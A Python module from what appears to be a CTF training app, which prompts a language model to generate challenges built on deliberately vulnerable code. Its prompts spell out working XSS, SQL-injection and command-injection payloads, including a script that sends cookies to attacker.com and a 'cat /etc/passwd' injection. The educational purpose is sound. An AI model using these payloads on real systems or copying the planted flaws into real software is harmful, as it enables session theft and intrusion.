"""
generator.py - CTF Challenge Generator using LLM via HuggingFace Inference API

Generates structured CTF-style cybersecurity challenges with:
- Vulnerable code snippet (technically accurate)
- Scenario description
- Progressive hints
- Solution + remediation
"""
import json
import os
import re
from openai import OpenAI
from app.config import HF_TEXT_MODEL, MAX_TOKENS, TEMPERATURE


def _client():
    return OpenAI(
        base_url="https://router.huggingface.co/v1",
        api_key=os.getenv("HF_TOKEN", ""),
    )


SYSTEM_PROMPT = """You are an expert penetration tester and CTF challenge designer with deep knowledge of web application security.

Your role is to create TECHNICALLY ACCURATE, REALISTIC CTF challenges for cybersecurity education.

CRITICAL RULES you must always follow:

1. VULNERABLE CODE must contain a REAL, EXPLOITABLE vulnerability — not just placeholder syntax.
   - For Reflected XSS: the code must echo unsanitised user input from $_GET, $_REQUEST, request.args, or req.query directly into HTML
   - For Stored XSS: the code must save input to a database and render it without escaping
   - For DOM XSS: the code must use document.write(), innerHTML, or eval() with unsanitised location.hash or URL params
   - For SQL Injection: use string concatenation in a SQL query, never parameterised queries
   - For CSRF: missing CSRF token, no SameSite cookie, no Origin check

2. PAYLOAD must be a REAL XSS/injection payload that actually works against the vulnerable code shown.
   - Reflected XSS payload example: "><script>alert(document.cookie)</script>
   - Stored XSS payload example: <img src=x onerror=alert(1)>
   - DOM XSS payload example: #<img src=x onerror=alert(document.cookie)>
   - NOT a form submission, NOT a username/password pair

3. SOLUTION must give exact step-by-step exploitation:
   - Step 1: identify the vulnerable parameter (name it explicitly e.g. ?search=)
   - Step 2: craft the payload
   - Step 3: deliver/trigger it
   - Include the exact URL or code to run

4. HINTS must be progressively more specific:
   - Hint 1: point to the vulnerability type and general area
   - Hint 2: name the specific vulnerable parameter or function
   - Hint 3: give the payload structure without the exact answer

5. REMEDIATION must show a FIXED code snippet alongside the explanation.

6. Respond with valid JSON ONLY — no markdown, no preamble, no explanation outside the JSON."""


# ── Vulnerability-specific guidance injected into the prompt ──────────────────

VULN_GUIDANCE = {
    "Reflected XSS": """
REFLECTED XSS REQUIREMENTS:
- The server must read a GET/POST parameter and echo it directly into the HTML response without sanitisation
- Use PHP ($_GET['param']), Python/Flask (request.args.get('param')), or Node/Express (req.query.param)
- The vulnerable line should look like: echo "<p>Results for: " . $_GET['search'] . "</p>";
- The payload must break out of the HTML context: "><script>alert(document.cookie)</script>
- The URL to trigger it: http://example.com/search.php?search="><script>alert(document.cookie)</script>""",

    "Stored XSS": """
STORED XSS REQUIREMENTS:
- Show both the input handling code (saving to DB without sanitisation) AND the output rendering code
- Use a simple mysqli or sqlite query that inserts raw user input
- The rendering code must echo the stored value directly: echo $row['comment'];
- The payload must be stored then triggered when the page loads: <script>fetch('https://attacker.com/?c='+document.cookie)</script>
- Explain that ANY user who views the page triggers the payload""",

    "DOM-based XSS": """
DOM XSS REQUIREMENTS:
- The JavaScript must read from location.hash, location.search, or document.referrer
- It must pass the value to innerHTML, document.write(), or eval() WITHOUT sanitisation
- Example: document.getElementById('output').innerHTML = location.hash.substring(1);
- The payload goes in the URL fragment: http://example.com/page.html#<img src=x onerror=alert(document.cookie)>
- No server-side code is involved — this is purely client-side""",

    "SQL Injection": """
SQL INJECTION REQUIREMENTS:
- Use string concatenation to build the SQL query: "SELECT * FROM users WHERE id = " + user_input
- Show the database connection and query execution
- For Easy: simple ' OR '1'='1 bypass
- For Medium: UNION-based to extract data
- For Hard: blind boolean or time-based
- Payload must be syntactically correct SQL that works against the shown query""",

    "CSRF": """
CSRF REQUIREMENTS:
- Show a state-changing form (password change, money transfer, profile update) with NO csrf_token field
- Show the server-side handler that processes the request without checking Origin or Referer
- The exploit is an HTML page the attacker hosts that auto-submits a form to the target
- Include the full attacker HTML page as the payload example""",

    "Broken Access Control": """
BROKEN ACCESS CONTROL REQUIREMENTS:
- Show an endpoint that uses a user-supplied ID to access a resource without checking ownership
- Example: GET /api/invoice?id=1234 where the server fetches invoice 1234 for ANY logged-in user
- The exploit is simply changing the ID in the request
- Show that the server never checks if the requesting user owns that resource""",

    "Command Injection": """
COMMAND INJECTION REQUIREMENTS:
- Show server-side code that passes user input directly to a shell command
- Use os.system(), exec(), shell_exec(), or subprocess with shell=True
- Example: os.system("ping " + user_input)
- Payload: 127.0.0.1; cat /etc/passwd
- The payload must work against the exact command shown""",
}


def _build_prompt(vuln_type: str, difficulty: str, context: str, xss_subtype: str = "") -> str:
    effective_type = xss_subtype if xss_subtype else vuln_type

    difficulty_guidance = {
        "Easy":   "Single vulnerable parameter, no filters, obvious entry point. Beginner-friendly. The payload works directly with no bypass needed.",
        "Medium": "Mild complexity — input is reflected in an attribute or JavaScript context requiring context-specific escaping. 2-3 exploitation steps.",
        "Hard":   "Filter bypass required — the app strips <script> tags or quotes. Requires alternative payload vectors (event handlers, encoding, polyglots).",
    }

    vuln_specific = VULN_GUIDANCE.get(effective_type, VULN_GUIDANCE.get(vuln_type, ""))

    return f"""Generate a technically accurate CTF challenge with these exact parameters:
- Vulnerability: {effective_type}
- Difficulty: {difficulty} — {difficulty_guidance[difficulty]}
- Context: {context}

{vuln_specific}

Return ONLY a valid JSON object with this exact structure (no extra fields, no markdown):
{{
  "title": "Creative but descriptive challenge title (max 6 words)",
  "difficulty": "{difficulty}",
  "vulnerability_type": "{effective_type}",
  "context": "{context}",
  "scenario": "2-3 sentences. Name the fictional app, describe what the student's role is, and what they have access to.",
  "objective": "One sentence starting with a verb e.g. 'Exploit the reflected XSS vulnerability in the search parameter to steal the admin session cookie.'",
  "vulnerable_code": "Write as a plain JSON string using \\n for newlines. NO triple quotes, NO backticks, NO separate code blocks. Just one PHP/Python/JS snippet with the vulnerability.",
  "flag_format": "Describe what a successful exploit looks like e.g. FLAG{{<script>alert(document.cookie)</script>}} or the cookie value retrieved",
  "hints": [
    "Hint 1 (immediate): Point to the vulnerability class and which part of the app to look at",
    "Hint 2 (2 min): Name the specific vulnerable parameter or function",
    "Hint 3 (5 min): Give the payload structure with a blank e.g. Try: ><PAYLOAD> in the search field"
  ],
  "solution": "Numbered step-by-step walkthrough. Step 1: identify. Step 2: craft payload. Step 3: deliver. Include the exact URL or code used at each step.",
  "payload_example": "The exact working payload string e.g. \\"><script>alert(document.cookie)</script> or the full malicious URL",
  "remediation": "2-3 sentences explaining the fix. If including code, escape all double quotes as \\\". Keep it short.",
  "learning_objectives": [
    "Specific technical thing learned 1",
    "Specific technical thing learned 2", 
    "Specific technical thing learned 3"
  ]
}}"""


def generate_challenge(
    vuln_type: str,
    difficulty: str,
    context: str,
    xss_subtype: str = "",
) -> dict:
    """
    Generate a CTF challenge using the LLM.
    Returns a dict with the challenge structure, or an error dict.
    """
    prompt = _build_prompt(vuln_type, difficulty, context, xss_subtype)

    try:
        resp = _client().chat.completions.create(
            model=HF_TEXT_MODEL,
            messages=[
                {"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user",   "content": prompt},
            ],
            max_tokens=MAX_TOKENS,
            temperature=0.5,  # Lower temperature for more consistent technical accuracy
        )
        # Try json.loads first; fall back to per-field regex extraction
        raw = resp.choices[0].message.content.strip()
        raw = re.sub(r"^```(?:json)?\s*", "", raw)
        raw = re.sub(r"\s*```$", "", raw)

        def extract_fields(text):
            """Extract fields using smart value extractor — handles unescaped quotes."""
            def get_val(txt, field):
                m = re.search('"' + field + r'"\s*:\s*"', txt)
                if not m: return None
                s = m.end()
                i = s
                while i < len(txt):
                    ch = txt[i]
                    if ch == chr(92): i += 2; continue
                    if ch == chr(34):
                        rest = txt[i+1:i+30]
                        nxt = rest.lstrip()
                        if not nxt or nxt[0] in (",", "}", "]"): return txt[s:i]
                        if re.match(r'\s*\n\s*"[a-z_]+"', txt[i+1:i+30]): return txt[s:i]
                    i += 1
                return txt[s:]

            def clean_code(val):
                # Strip leaked JSON fields from vulnerable_code
                import re as _r
                parts = _r.split(r'\n\s*"[a-z_]+"\s*:', val)
                return parts[0].strip().strip(chr(34)).strip()

            result = {}
            for field in ["title","difficulty","vulnerability_type","context","scenario",
                          "objective","flag_format","payload_example","remediation","vulnerable_code"]:
                v = get_val(text, field)
                if v:
                    v = v.replace(chr(92)+chr(34), chr(34)).replace("\\n", "\n").replace("\\\\", "\\")
                    if field == "vulnerable_code": v = clean_code(v)
                    result[field] = v
            def get_array(txt, field):
                pat = chr(34) + field + r'"\s*:\s*\['
                m = re.search(pat, txt)
                if not m: return []
                pos = m.end()
                items = []
                ws = set([' ', '\t', '\n', '\r', ','])
                while pos < len(txt):
                    while pos < len(txt) and txt[pos] in ws:
                        pos += 1
                    if pos >= len(txt) or txt[pos] == ']':
                        break
                    if txt[pos] != chr(34):
                        pos += 1
                        continue
                    s = pos + 1
                    i = s
                    while i < len(txt):
                        ch = txt[i]
                        if ch == chr(92):
                            i += 2
                            continue
                        if ch == chr(34):
                            nxt = txt[i+1:i+10].lstrip()
                            if not nxt or nxt[0] in (',', ']', '}'):
                                val = txt[s:i]
                                val = val.replace(chr(92)+chr(34), chr(34))
                                val = val.replace('\\n', '\n')
                                if len(val.strip()) > 5:
                                    items.append(val)
                                pos = i + 1
                                break
                        i += 1
                    else:
                        break
                return items

            for field in ["hints", "solution", "learning_objectives"]:
                arr = get_array(text, field)
                if arr:
                    result[field] = arr
            return result

        try:
            challenge = json.loads(raw)
        except (json.JSONDecodeError, ValueError):
            challenge = extract_fields(raw)
            if not challenge.get("title"):
                return {"error": "Could not parse response. Try again.", "raw_response": raw, "generated": False}

        challenge["generated"] = True
        return challenge

    except json.JSONDecodeError as e:
        return {
            "error": f"LLM response was not valid JSON. Try generating again.",
            "raw_response": raw if "raw" in dir() else "",
            "generated": False,
        }
    except Exception as e:
        return {
            "error": f"Generation failed: {str(e)}",
            "generated": False,
        }


def _esc(s):
    """Escape HTML special chars for safe Markdown display."""
    return str(s).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")


def format_challenge_markdown(challenge: dict) -> str:
    """Format a challenge dict as readable markdown for display."""
    if not challenge.get("generated") or "error" in challenge:
        return f"❌ Error: {challenge.get('error', 'Unknown error')}"

    hints = challenge.get("hints", [])
    if isinstance(hints, list):
        hints_md = "\n".join([f"  {i+1}. {h}" for i, h in enumerate(hints)])
    else:
        hints_md = str(hints)

    objectives = challenge.get("learning_objectives", [])
    if isinstance(objectives, list):
        objectives_md = "\n".join([f"  - {o}" for o in objectives])
    else:
        objectives_md = str(objectives)

    solution = challenge.get("solution", "")
    if isinstance(solution, list):
        # Merge split steps: "Step 1: header" + "  content" -> "Step 1: header — content"
        import re as _re
        merged = []
        for item in solution:
            item = item.strip()
            if len(item) < 6:
                continue
            if merged and not _re.match(r'Step\s*\d', item, _re.I):
                merged[-1] = merged[-1] + " " + item
            else:
                merged.append(item)
        solution = "\n".join([f"{i+1}. {_esc(s)}" for i, s in enumerate(merged)])

    return f"""# 🚩 {challenge.get('title', 'CTF Challenge')}

**Difficulty:** {challenge.get('difficulty')} | **Type:** {challenge.get('vulnerability_type')} | **Context:** {challenge.get('context')}

## 📖 Scenario
{challenge.get('scenario', '')}

## 🎯 Objective
{challenge.get('objective', '')}

## 💻 Vulnerable Code
```
{challenge.get('vulnerable_code', '')}
```

## 🏁 Flag Format
{_esc(challenge.get('flag_format', ''))}

## 💡 Hints (Progressive)
{hints_md}

---

### 🔓 Solution
{solution}

### 💉 Example Payload
```
{challenge.get('payload_example', '')}
```

### 🔧 Remediation
{challenge.get('remediation', '')}

---

## 📚 Learning Objectives
{objectives_md}
"""
